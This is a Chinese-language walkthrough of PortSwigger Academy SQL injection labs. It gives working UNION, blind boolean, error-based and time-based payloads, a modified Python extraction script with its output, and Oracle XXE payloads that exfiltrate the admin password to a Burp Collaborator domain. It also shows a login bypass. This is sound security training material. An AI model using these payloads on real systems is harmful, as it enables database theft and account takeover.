# SQL injection
## [Lab: SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
### 題目敘述
This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values. 

### 題目解釋
簡單來說，這一題需要透過 `UNION` 找到欄位的數量，而因為不知道欄位的格式，可以先用 null 來做測試，題目已經說弱點在 `category` 這個 filter 底下，所以會是在

```
https://ac7d1f771f992c12c056065800b900f0.web-security-academy.net/filter?category=Accessories
```

這邊修改 `category` 的參數達到 SQLi，可以透過 `UNION SELECT NULL -- -`, `UNION SELECT NULL,NULL -- -` 試到不會噴錯為止

### 解答
```
https://ac7d1f771f992c12c056065800b900f0.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL%20--%20-
```

---

## [Lab: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

### 題目敘述
 This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 

### 題目解釋

除了前一提的 SQLi 之外，這一題還需要強迫 SQL 吐出指定的數值，看起來應該每一次題目都會不同，以本題為例需要讓 SQL 吐出 `t33quC`，這邊就直接把參數放到 `UNION SELECT` 裡面就好

### 解答
```
https://acf21fab1e725d94c0ff4ee900e7007f.web-security-academy.net/filter?category=123%27%20UNION%20SELECT%20NULL,%27t33quC%27,NULL%20--%20-
```

---

## [Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
### 題目敘述
 This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
### 題目解釋
要透過 SQLi 找另外一張表格，叫做 `users`，他的 Column 分別叫做 `username` 跟 `password`，然後需要以 `administrator` 登入。


### 解答

先測試欄位數量，確認有兩個

```
https://accb1f1e1eb490e6c0500d1700440040.web-security-academy.net/filter?category=1%27%20UNION%20SELECT%20NULL,NULL%20--%20-
```

如果是正常的 SQL，我們可以輸入 
```
SELECT password FROM users WHERE username='administrator'
```


所以改成 Union based 的 SQLi 的話，就變成
```
123' UNION SELECT password,NULL FROM users WHERE username='administrator' -- -
```

完整的 URL
```
https://accb1f1e1eb490e6c0500d1700440040.web-security-academy.net/filter?category=123%27%20UNION%20SELECT%20password,NULL%20FROM%20users%20WHERE%20username=%27administrator%27%20--%20-
```

就會發現下面噴出了 administrator 的密碼，用這組密碼搭配 `administrator` 的帳號登入即可過關



## [Lab: SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
### 題目敘述
 This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

### 題目解釋
看標題感覺需要在同一個 column 中取多個 column 的資料。

### 解答
經過了簡單的測試會發現，總共有 2 個 column 且第一個 Column 只能是數字，第二個才能是 String

```
https://ac281f4c1e7affa4c00f9027009000f6.web-security-academy.net/filter?category=123%27%20UNION%20SELECT%201,NULL%20--%20-
```

偷看一下 SQL 的版本，輸入 `version()`

```
https://ac281f4c1e7affa4c00f9027009000f6.web-security-academy.net/filter?category=123%27%20UNION%20SELECT%201,version()%20--%20-
```


會發現他回傳了 `PostgreSQL 11.14 (Debian 11.14-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit`


PostgreSQL 的 String Concat 是 `|| `， 例如可以輸入 `SELECT 'meow' || '123'` 他會回傳 `meow123`

回到題目要取 `usernames` 跟 `passwords` ， 就可以一口氣取

```
https://ac281f4c1e7affa4c00f9027009000f6.web-security-academy.net/filter?category=123%27%20UNION%20SELECT%201,username%20||%20%27:%27%20||%20password%20from%20users%20--%20-
```

這邊就順利地回傳了 3 組密碼，取 administrator 的帳密登入即可過關


## [Lab: SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
### 題目敘述
This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

### 題目解釋
這一題需要打的是 Oracle 的 Database，並顯示系統版本。

### 解答
Oracle 的特色是，無論如何，所有的 SELECT 都必須要搭配 FROM，如果沒有FROM 的話可以寫 `FROM dual`

先確認 column 數量為 3
```
https://aca41f4d1e11b12dc01e79fd000b000b.web-security-academy.net/filter?category=123%27%20UNION%20SELECT%20NULL,NULL%20FROM%20dual%20--%20-
```

如果要依照題目需求顯示系統版本的話，需要 `select BANNER from v$version`

因此完整 URL

```
https://aca41f4d1e11b12dc01e79fd000b000b.web-security-academy.net/filter?category=123%27%20UNION%20SELECT%20NULL,BANNER%20FROM%20v$version%20--%20-
```

## [Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

### 題目敘述
This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

### 題目解釋
用 UNION 來看資料庫版本。

### 解答

```
https://aced1ff71ed4c6a2c05f055e00f8002a.web-security-academy.net/filter?category=123%27%20UNION%20SELECT%20NULL,version()%20--%20-
```

## [Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

### 題目敘述
 This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

### 題目解釋
透過 UNION 取非 Oracle 的 DB。

### 解答

先確認一下 DB 版本跟 Column 寬度。
```
https://ac8c1f641f76c61fc06f0d3200fb001f.web-security-academy.net/filter?category=123%27%20UNION%20SELECT%20NULL,version()%20--%20-
```
可以知道他是 PostgreSQL ，且 Column 寬度為 2

首先觀察資料庫裡面有哪些 schema

```
https://ac8c1f641f76c61fc06f0d3200fb001f.web-security-academy.net/filter?category=123%27%20UNION%20SELECT%20NULL,schemaname%20FROM%20pg_tables%20--%20-
```
回傳了三個 `information_schema`, `public`, `pg_catalog`，直覺猜 `pbulic`


觀察 `public` 裡面有哪些 table

```
https://ac8c1f641f76c61fc06f0d3200fb001f.web-security-academy.net/filter
?category=123' UNION SELECT NULL,tablename FROM pg_tables WHERE schemaname='public' -- -
```

噴出了 `users_ppeymv` 跟 `products`，這邊我猜每個人的題目可能都會是亂數，以我這邊的例子是 `users_ppeymv`


接下來觀察 `users_ppeymv` 底下有哪些 Column

```
https://ac8c1f641f76c61fc06f0d3200fb001f.web-security-academy.net/filter
?category=123' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_ppeymv' -- -
```

可以看到回傳了兩個 row，分別是 `password_xtgnur` 跟 `username_bdounz`

到此為止，我們知道了， table 名稱是 `users_ppeymv`， column 名稱是 `username_bdounz` 與 `password_xtgnur`，資料庫種類是 PostgreSQL

最後只需要取資料即可

```
https://ac8c1f641f76c61fc06f0d3200fb001f.web-security-academy.net/filter
?category=123' UNION SELECT NULL,username_bdounz || ':' || password_xtgnur FROM users_ppeymv -- -
```
透過以上指令，即可取出 administrator 的帳密，登入即可過關

## [Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
### 題目敘述
This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

### 題目解釋
簡單來說，這一題來打 Oracle

### 解答
一樣先來觀察 column 長度確定為 2

```
https://ac891f181fe52961c027015100b10005.web-security-academy.net/filter
?category=1' UNION SELECT NULL,NULL FROM dual -- -
```

接下來觀察有哪些 Database

```
https://ac891f181fe52961c027015100b10005.web-security-academy.net/filter
?category=1' UNION SELECT NULL,OWNER FROM ALL_TABLES -- -
```
發現他回傳了一大堆QQ。這沒有靈力應該是猜不出來ㄉ`APEX_040000`, `CTXSYS`, `FLOWS_FILES`, `HR`, `MDSYS`, `OUTLN`, `SYS`, `SYSTEM`, `XDB`

不管了，我們直接來看有哪些 Table

```
https://ac891f181fe52961c027015100b10005.web-security-academy.net/filter
?category=1' UNION SELECT NULL,TABLE_NAME FROM ALL_TABLES -- -
```

摁 ... 果然噴了幾千個，直接透過 CTRL + F 搜尋 `USERS` 可以找到符合出題風格 `USERS` 後面配亂數的 `USERS_IOWIWJ`，但我們還是可以回來觀察一下 這個 Table 放在哪個 DB 中。
```
https://ac891f181fe52961c027015100b10005.web-security-academy.net/filter
?category=1' UNION SELECT NULL,OWNER FROM ALL_TABLES WHERE TABLE_NAME='USERS_IOWIWJ' -- -
```
透過回傳值可以知道他在 `SYSTEM` 裡面

接下來取 COLUMN
```
https://ac891f181fe52961c027015100b10005.web-security-academy.net/filter
?category=1' UNION SELECT NULL,COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS_IOWIWJ' -- -
```
可以得知帳號密碼分別在 `USERNAME_DYIIWP` 與 `PASSWORD_NLTKTK` 中


最後就是取資料ㄌ!!

```
https://ac891f181fe52961c027015100b10005.web-security-academy.net/filter
?category=1' UNION SELECT NULL,USERNAME_DYIIWP || ':' || PASSWORD_NLTKTK FROM SYSTEM.USERS_IOWIWJ -- -
```

這樣就可以取得 administrator 的帳密進行登入


## [Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

### 題目敘述
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

### 題目解釋
這題要打的點在餅乾，然後是 Blind Based 的。

### 解答
按下 F12 觀察 `TrackingId` 的餅乾
![](https://i.imgur.com/XbFOy6U.png)

如果餅乾上輸入
```
' OR 1=1 -- -
```
F5 後，畫面會出現 `Welcome back!`

如果餅乾上輸入
```
' OR 1=1 -- -
```
則 F5 後，畫面上不會出現 `Welcome back!`

對著 Requests 選複製 cURL
![](https://i.imgur.com/5gqFVic.png)
```
curl 'https://ac081f6f1f4292d2c0304102009c0069.web-security-academy.net/' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: zh-TW,zh-HK;q=0.8,zh-CN;q=0.7,zh-SG;q=0.5,en-US;q=0.3,en;q=0.2' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' -H $'Cookie: TrackingId=\' OR 1=1 -- -; session=XA6OawbATmXMmsZQwTKYv2wuPixeVuuH' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-User: ?1'
```

透過 https://curlconverter.com/ 轉成 Requests


先通靈猜他是 PostgreSQL，使用 [SQLMe0w](https://github.com/stevenyu113228/SQLME0w) 修改 `boolean_based_blind` 函數為以下

```python
def boolean_based_blind(condition):
    cookies = {
        'TrackingId': f'\' OR {condition} -- -',
        'session': 'XA6OawbATmXMmsZQwTKYv2wuPixeVuuH',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-TW,zh-HK;q=0.8,zh-CN;q=0.7,zh-SG;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
    }

    response = requests.get('https://ac081f6f1f4292d2c0304102009c0069.web-security-academy.net/', headers=headers, cookies=cookies)
    if 'Welcome back!' in response.text : # change me to other keyword or length
        return True
    else:
        return False
```

執行測試可以確認測試成功
```
steven@DESKTOP-08DE77L:~/SQLME0w$ python3 SQLME0w_PostgreSQL.py 

▒█▀▀▀█ ▒█▀▀█ ▒█░░░ ▒█▀▄▀█ ▒█▀▀▀ █▀▀█ █░░░█
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█▒█▒█ ▒█▀▀▀ █▄▀█ █▄█▄█
▒█▄▄▄█ ░▀▀█▄ ▒█▄▄█ ▒█░░▒█ ▒█▄▄▄ █▄▄█ ░▀░▀░ for PostgreSQL

 
 🐱 (0) System Test
 🐱 (1) Get Current DB
 🐱 (2) Get All DBS
 🐱 (3) Get Schemas
 🐱 (4) Get Tables
 🐱 (5) Get Columns
 🐱 (6) Get Data
Your Option : 0
Intend True:  True
Intend False:  False
✅ Test success 🐱🐱🐱🐱🐱🐱🐱🐱🐱
```

透過 options 1 可以知道目前的 schema 是 `public`
```
Your Option : 1
[🐱] Query DB Strings Length
[😺😺]Current DB Length: 8
[😺😺]Current DB Name: postgres
[🐱] Query Schema Strings Length
[😺😺]Current Schema Length: 6
[😺😺]Current Schema Name: public
```

透過 options 4 輸入 schema name `public` 可以取出兩個 table，分別是 `users` 跟 `tracking`
```
Your Option : 4
Schema Name : public
[🐱] Query Tables Size
Tables Size: 2
[🐱] Query Table Strings Length
[😺😺]Table Strings Length: [5, 8]
[🐱] Query Table Name
Table_Name[0]=users
Table_Name[1]=tracking
[😺😺]Table_Name: ['users', 'tracking']
```

透過 option 5 輸入 schema name `public` 與 Table_Name `users` 可以知道 Column name 為 `username` 與 `password`

透過 option 6 輸入 table name 為 `users` 以及 column name 為 `username || ':' || password`，可以取得最終的資料庫內容，透過 administrator 帳密登入即可過關


## [Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
### 題目敘述
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 
### 題目解釋
這一題跟上一題很像，不過需要構成 Error 才會噴出東西。

### 解答
測了一下會發現他是 Oracle 的 DB，然後透過 portswigger 的 [SQLi Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) 中的 Conditional errors，可以找到 ` SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual ` 這段 Payload，些微變形後讓餅乾變成這樣

```
1' || (SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE 'a' END FROM DUAL) || '12
```

其中 `1=1` 的地方放 Condition

套 SQLMe0w 的 Oracle 版本，`boolean_based_blind` 函數修改如下

```python
def boolean_based_blind(condition):
    cookies = {
        'TrackingId': f"1' || (SELECT CASE WHEN ({condition}) THEN to_char(1/0) ELSE 'A' END FROM dual) || '",
        'session': "edUkNnKp8nnaCX9z4YekOGUj06TeSv0T",
    }

    headers = {
    # 略  
    }

    response = requests.get('https://ac331f801ec53461c090057300890038.web-security-academy.net/', headers=headers, cookies=cookies)

    if response.status_code == 500: # change me to other keyword or length
        return True
    else:
        return False
```

透過 Option 0 進行測試，測試成功
```
steven@DESKTOP-08DE77L:~/SQLME0w$ python3 SQLME0w_Oracle_lab-conditional-errors.py 

▒█▀▀▀█ ▒█▀▀█ ▒█░░░ ▒█▀▄▀█ ▒█▀▀▀ █▀▀█ █░░░█
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█▒█▒█ ▒█▀▀▀ █▄▀█ █▄█▄█
▒█▄▄▄█ ░▀▀█▄ ▒█▄▄█ ▒█░░▒█ ▒█▄▄▄ █▄▄█ ░▀░▀░ for Oracle

 
 🐱 (0) System Test
 🐱 (1) Get Current DB
 🐱 (2) Get All DBS
 🐱 (3) Get Tables
 🐱 (4) Get Columns
 🐱 (5) Get Data
Your Option : 0
Intend True:  True
Intend False:  False
✅ Test success 🐱🐱🐱🐱🐱🐱🐱🐱🐱
```


因為題目已經提供了 table 與 column 名稱，所以我們可以直接寫死在程式瑪中，這邊我們也不需要考慮資料庫名稱，所以些微修改程式碼，(註解的為原始的)

```python
# db = input("Database Name : ")
db = "123"
# data_size_right = f"(SELECT COUNT({column}) FROM {db}.{table})"
data_size_right = f"(SELECT COUNT({column}) FROM {table})"
# data_str_len_right = "(SELECT A FROM (SELECT ROWNUM no, LENGTH({column}) AS A FROM {db}.{table}) WHERE no={db_num})"
data_str_len_right = "(SELECT A FROM (SELECT ROWNUM no, LENGTH({column}) AS A FROM {table}) WHERE no={db_num})"
# data_name_right_condition = "(SELECT A FROM (SELECT ROWNUM no,ASCII(SUBSTR({column},{data_name_index},1)) AS A FROM {db}.{table}) WHERE no={size})"
data_name_right_condition = "(SELECT A FROM (SELECT ROWNUM no,ASCII(SUBSTR({column},{data_name_index},1)) AS A FROM {table}) WHERE no={size})"
```

接下來使用 Option 5 即可取資料
```
Your Option : 5
Table Name : users
Column Name (support '||'): username || ':' || password

// 略...
[😺😺]Data_Name: ['administrator:bvnwdswmotsidqv2h6oe', 'carlos:4y9e16wv1ny9a0g8got4', 'wiener:lt6g3hgihj263yz3pn32']
```

透過取出的 administrator 密碼登入就可以過關ㄌ

## [Lab: Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
### 題目敘述
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 
### 題目解釋
看樣子一樣在餅乾，然後需要讓系統 Delay 10 秒。

### 解答
透過 portswigger 的 [SQLi Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) 中可以找到 Time Delay 的方法

測了一下發現餅乾放

```
1' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) -- -
```

就可以 Delay 10 秒，然後就過關ㄌ

## [Lab: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

### 題目敘述
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

### 題目解釋
OK，終於來到所有 SQLi 中，我最討厭的部分了 QQ，因為真的很浪費時間，Time Based Blind。

### 解答
先戳了一下，發現前一題的 Payload 可以用

```
1' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) -- -
```

接下來我們可以透過 SQLMe0w 來解題，但需要先做一點點觀察，先把 function 改寫成下面這樣，順便把 Sleep 改短

```python
def boolean_based_blind(condition):
    cookies = {
        'TrackingId': f'1\' || (SELECT CASE WHEN ({condition}) THEN pg_sleep(0.5) ELSE pg_sleep(0) END) -- -',
        'session': 'xM48SVYJJorBpSN7kCi2WvvrhaJeEDGH',
    }
# 略
    start_time = time.time()
    response = requests.get('https://acf61f121e7eff87c0fd9a2800bc00db.web-security-academy.net/', headers=headers, cookies=cookies)
    time_diff = time.time() - start_time
    print("time_diff:" , time_diff)
    if 'Welcome back!' in response.text : # 先隨便，之後會改
        return True
    else:
        return False

```

在這個情境下跑 Option 0， 觀察 `time_diff`，以我的例子來看， True 時會是 `1.66` 秒， False 時會是 `1.16` 秒，平均值大概是 `1.4` ，所以把 if 的條件設為大於 1.4 視為 True。


備註：這邊數值取決於網路狀況，每個人可能會有所不同，需要自己湊一個比較穩定的數字，多跑幾次。

```python
    start_time = time.time()
    response = requests.get('https://acf61f121e7eff87c0fd9a2800bc00db.web-security-academy.net/', headers=headers, cookies=cookies)
    time_diff = time.time() - start_time
    # print("time_diff:" , time_diff)
    if time_diff > 1.4 :
        return True
    else:
        return False
```

再跑一次 Option 0 的 System Test 就會成功ㄌ！


接下來這一題也是已知 Table 跟 Column，所以可以直接用 Option 6 來取資料，不過需要注意的是，因為 Time Based 的緣故，所以 Thread 數量必須設為 1。


這邊為了加速，也可以直接修改關於 `get_data()` 的程式，在 SQL 語法後面加上 `WHERE username='administrator'`，就可以只取 administrator 的密碼。
```python
schema = ''
data_size_right = f"(SELECT COUNT({column}) FROM {table} WHERE username='administrator')"
data_str_len_right = "(SELECT LENGTH({column}) FROM {table} WHERE username='administrator' LIMIT 1 OFFSET {schema_num})"
data_name_right_condition = "(SELECT ASCII(SUBSTRING({column},{data_name_index},1)) FROM {table} WHERE username='administrator' LIMIT 1 OFFSET {size})"
```

```
Your Option : 6
Threads (Suggest 10): 1
Table Name : users
Column Name (support '||'): password
```

跑下去後，可以去泡個咖啡，看個影片，吃個飯再回來收結果 QQ， Time Based 真的很慢。

等跑完後，就會噴 administrator 的密碼ㄌ！

## [Lab: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
### 題目敘述
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. 
### 題目解釋
這一題需要用到 Blind Based 的 Out of Bound，也就是需要想辦法讓 SQL 發出 DNS 查詢的請求。不過這一題下面備註有提到，必須使用 Burp Suite Pro，當然現實場景上不一定會需要用到，這邊只是因為他們的防火牆設計對外只能連 `burpcollaborator.net` 的緣故，這邊常見可以使用的替代方案是 http://dnslog.cn/ 。 由於這提需要使用到 Burp Pro，而且價格不斐，所以沒有的人可以跳過。

### 解答
開啟 Burp Suite Pro 後，左上角選 `Burp Collaborator client`
![](https://i.imgur.com/MOPxCsG.png)

接下來點選 `Copy to clipboard`，此時按下貼上，出現的 domain，只要有接收到 Request 或是 DNS 的查詢，就會出現在下面的框框中。


回到 Web，這一題只需要讓 SQL 做查詢就好，觀察 [Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) 做 OOB 的 Payload


湊了一下大概是這樣

```
123' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://3lpwnvde33g6z9iskfiy33xm0d65uu.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual -- -
```

不過這個不能直接塞到 F12 的餅乾欄位裡面，會爛掉，所以可以先把上面這一坨做一下 URL Encode 變成

```
123%27%20UNION%20SELECT%20extractvalue%28xmltype%28%27%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20root%20%5B%20%3C%21ENTITY%20%25%20remote%20SYSTEM%20%22http%3A%2F%2F3lpwnvde33g6z9iskfiy33xm0d65uu.burpcollaborator.net%2F%22%3E%20%25remote%3B%5D%3E%27%29%2C%27%2Fl%27%29%20FROM%20dual%20--%20-
```

塞進瀏覽器後 F5 即可完成。

送出後就過關了，不過還是可以回來我們的 Burp Collaborator 觀察一下上面的記錄。

![](https://i.imgur.com/AZ03wv3.png)


## [Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
### 題目敘述
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 
### 題目解釋
這一題跟前一題差不多，但除了發起 DNS 查詢之外，我們還需要藉機把資料帶出來，一樣需要用到 Burp Pro。

### 解答

觀察 [Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)，可以看出基本型 Payload 是
```
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
```

就跟剛剛得差不多，只是用字串串接的方法來把答案帶在 subdomain，這一題需要取 administrator 的密碼，所以我們可以先寫標準SQL。

```
SELECT password FROM users WHERE username='administrator'
```

然後重新準備一個乾淨的 Burp Collaborator

完整 Payload

```
123' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.otltb6htbq5vsqx5bpvnxaub92fs3h.burpcollaborator.net/"> %remote;]>'),'/l')  FROM dual -- -
```

轉 URL Encode

```
123%27%20UNION%20SELECT%20extractvalue%28xmltype%28%27%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20root%20%5B%20%3C%21ENTITY%20%25%20remote%20SYSTEM%20%22http%3A%2F%2F%27%7C%7C%28SELECT%20password%20FROM%20users%20WHERE%20username%3D%27administrator%27%29%7C%7C%27.otltb6htbq5vsqx5bpvnxaub92fs3h.burpcollaborator.net%2F%22%3E%20%25remote%3B%5D%3E%27%29%2C%27%2Fl%27%29%20%20FROM%20dual%20--%20-%0A
```

就能收到密碼ㄌ，密碼在最左邊的 subdomain 上，以這個範例來看是 `21ozznf4cnhworyrn6fz`
![](https://i.imgur.com/eJxjUVN.png)

## [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

### 題目敘述
 This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased. 

### 題目解釋
希望可以 Query 出所有的東西，而原始的 SQL 已經寫在上面ㄌ。

### 解答

只需要把他的 `category` 後面的單引號合併，並把後面的東西註解，也就是輸入 `' or 1=1 -- -`，就可以過關

```
https://ac2f1fb01e9914f9c0b712fe002e0077.web-security-academy.net/filter?category=%27%20or%201=1%20--%20-
```


## [Lab: SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
### 題目敘述
 This lab contains an SQL injection vulnerability in the login function.

To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user. 
### 題目解釋
蛤，為什麼這是最後一題，這應該要是第一題ㄅ，就傳說中的萬用密碼ㄚ

### 解答
- 帳號： `administrator' -- -`
- 密碼: `meow`


